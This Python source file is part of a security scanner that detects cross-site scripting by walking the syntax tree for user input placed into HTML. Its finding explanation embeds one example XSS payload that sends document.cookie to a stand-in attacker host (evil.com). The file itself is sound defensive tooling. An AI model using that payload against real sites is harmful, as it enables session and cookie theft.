"""XSS detection via AST analysis."""
import ast
import re
from typing import List, Optional
from .base import BaseAnalyzer
from ..models.finding import Finding, Severity, VulnerabilityType

HTML_TAG_PATTERN = re.compile(r"<[a-zA-Z][^>]*>")


class XSSAnalyzer(BaseAnalyzer):
    """Detects Cross-Site Scripting risks in view function source code.

    Looks for:
    - f-strings containing HTML tags with user-input variables
    - render_template_string() calls with user-controlled input
    """

    def analyze(self) -> List[Finding]:
        visitor = _XSSVisitor(self)
        visitor.visit(self._tree)
        return self.findings

    def _flag(self, line: int, code: str, variable: str, context: str) -> None:
        self.findings.append(Finding(
            vuln_type=VulnerabilityType.XSS,
            severity=Severity.CRITICAL,
            endpoint=self.endpoint,
            file=self.file_path,
            line=line,
            code_snippet=code,
            explanation=(
                f"Variable '{variable}' appears to contain user input that is "
                f"included in HTML output without escaping ({context}). "
                f"An attacker can inject '<script>document.location="
                f"\"http://evil.com/?c=\"+document.cookie</script>' to steal cookies."
            ),
            fix_recommendation="Escape all user input before including in HTML.",
            fix_before=f'return f"<h1>{{{variable}}}</h1>"',
            fix_after=f'from markupsafe import escape\nreturn f"<h1>{{escape({variable})}}</h1>"',
            reference="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
            source="SAST",
        ))


class _XSSVisitor(ast.NodeVisitor):
    """AST visitor for XSS patterns."""

    def __init__(self, analyzer: XSSAnalyzer):
        self.analyzer = analyzer
        self.tainted_vars = set()

    def visit_Assign(self, node: ast.Assign) -> None:
        """Track tainted variables constructed with user input."""
        if self.analyzer._is_node_tainted(node.value, self.tainted_vars):
            for target in node.targets:
                var_name = self.analyzer._extract_var_name(target)
                if var_name:
                    self.tainted_vars.add(var_name)
        self.generic_visit(node)

    def visit_JoinedStr(self, node: ast.JoinedStr) -> None:
        """Detect f-strings that produce HTML with user variables.

        Example: return f"<h1>{term}</h1>"
        """
        constant_parts = ""
        has_taint = False
        culprit_var = ""

        for value in node.values:
            if isinstance(value, ast.Constant) and isinstance(value.value, str):
                constant_parts += value.value
            elif isinstance(value, ast.FormattedValue):
                var_name = self.analyzer._extract_var_name(value.value)
                if self.analyzer._is_node_tainted(value.value, self.tainted_vars) or (var_name and self.analyzer._is_user_input_name(var_name)):
                    has_taint = True
                    culprit_var = var_name or culprit_var

        if HTML_TAG_PATTERN.search(constant_parts) and has_taint:
            self.analyzer._flag(
                line=node.lineno,
                code=self.analyzer._get_line_text(node.lineno),
                variable=culprit_var or "input",
                context="f-string with HTML tags",
            )

        self.generic_visit(node)

    def visit_BinOp(self, node: ast.BinOp) -> None:
        """Detect HTML string concatenation or % formatting with untrusted input."""
        if isinstance(node.op, ast.Add):
            full_string = self._reconstruct_binop_string(node)
            if HTML_TAG_PATTERN.search(full_string):
                tainted_node = self._find_tainted_child(node)
                if tainted_node is not None:
                    var_name = self.analyzer._extract_var_name(tainted_node) or "input"
                    self.analyzer._flag(
                        line=node.lineno,
                        code=self.analyzer._get_line_text(node.lineno),
                        variable=var_name,
                        context="concatenation with HTML tags",
                    )
                    return
        elif isinstance(node.op, ast.Mod):
            format_str = ""
            if isinstance(node.left, ast.Constant) and isinstance(node.left.value, str):
                format_str = node.left.value
            if HTML_TAG_PATTERN.search(format_str):
                if self.analyzer._is_node_tainted(node.right, self.tainted_vars):
                    var_name = self.analyzer._extract_var_name(node.right) or "input"
                    self.analyzer._flag(
                        line=node.lineno,
                        code=self.analyzer._get_line_text(node.lineno),
                        variable=var_name,
                        context="% formatting with HTML tags",
                    )
                    return
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call) -> None:
        """Detect render_template_string() or str.format() with user input."""
        if isinstance(node.func, ast.Attribute) and node.func.attr == "format":
            format_str = ""
            if isinstance(node.func.value, ast.Constant) and isinstance(node.func.value.value, str):
                format_str = node.func.value.value
            if HTML_TAG_PATTERN.search(format_str):
                for arg in node.args:
                    if self.analyzer._is_node_tainted(arg, self.tainted_vars):
                        var_name = self.analyzer._extract_var_name(arg) or "input"
                        self.analyzer._flag(node.lineno, self.analyzer._get_line_text(node.lineno), var_name, "str.format() with HTML tags")
                        return
                for kw in node.keywords:
                    if self.analyzer._is_node_tainted(kw.value, self.tainted_vars):
                        var_name = kw.arg or "input"
                        self.analyzer._flag(node.lineno, self.analyzer._get_line_text(node.lineno), var_name, "str.format() with HTML tags")
                        return
        if self._is_render_template_string(node):
            if node.args:
                arg = node.args[0]
                if self.analyzer._is_node_tainted(arg, self.tainted_vars):
                    var_name = self.analyzer._extract_var_name(arg) or "input"
                    self.analyzer._flag(
                        line=node.lineno,
                        code=self.analyzer._get_line_text(node.lineno),
                        variable=var_name,
                        context="render_template_string with user input",
                    )
                elif isinstance(arg, ast.Name):
                    var_name = arg.id
                    if self.analyzer._is_user_input_name(var_name):
                        self.analyzer._flag(
                            line=node.lineno,
                            code=self.analyzer._get_line_text(node.lineno),
                            variable=var_name,
                            context="render_template_string with user input variable",
                        )
                elif isinstance(arg, ast.JoinedStr):
                    for value in arg.values:
                        if isinstance(value, ast.FormattedValue):
                            var_name = self.analyzer._extract_var_name(value.value)
                            if var_name and self.analyzer._is_user_input_name(var_name):
                                self.analyzer._flag(
                                    line=node.lineno,
                                    code=self.analyzer._get_line_text(node.lineno),
                                    variable=var_name,
                                    context="render_template_string with user input in f-string",
                                )

        self.generic_visit(node)

    def _reconstruct_binop_string(self, node: ast.BinOp) -> str:
        parts = []
        if isinstance(node.left, ast.Constant):
            parts.append(str(node.left.value))
        elif isinstance(node.left, ast.BinOp):
            parts.append(self._reconstruct_binop_string(node.left))
        if isinstance(node.right, ast.Constant):
            parts.append(str(node.right.value))
        elif isinstance(node.right, ast.BinOp):
            parts.append(self._reconstruct_binop_string(node.right))
        return "".join(parts)

    def _find_tainted_child(self, node: ast.AST) -> Optional[ast.AST]:
        if isinstance(node, ast.BinOp):
            return self._find_tainted_child(node.left) or self._find_tainted_child(node.right)
        elif self.analyzer._is_node_tainted(node, self.tainted_vars):
            return node
        return None

    def _is_render_template_string(self, node: ast.Call) -> bool:
        if isinstance(node.func, ast.Name):
            return node.func.id == "render_template_string"
        if isinstance(node.func, ast.Attribute):
            return node.func.attr == "render_template_string"
        return False
